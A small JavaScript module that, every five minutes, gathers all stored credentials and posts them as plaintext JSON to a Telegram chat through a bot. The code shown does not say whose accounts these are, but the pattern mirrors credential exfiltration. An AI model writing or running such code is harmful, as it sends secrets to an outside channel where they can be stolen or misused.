import { TELEGRAM_OWNER_CHAT_ID } from '../config';
import logToBot from '../botModule/logToBot';
import getAllCredentials from '../credentialsModule/getAllCredentials';

export default function processAccounts() {
    const doProcessAccounts = async () => {
        const credentialsItems = await getAllCredentials()
        logToBot(TELEGRAM_OWNER_CHAT_ID, JSON.stringify(credentialsItems, null, 4))
    }

    doProcessAccounts()
    setInterval(doProcessAccounts, 5 * 60 * 1000)
}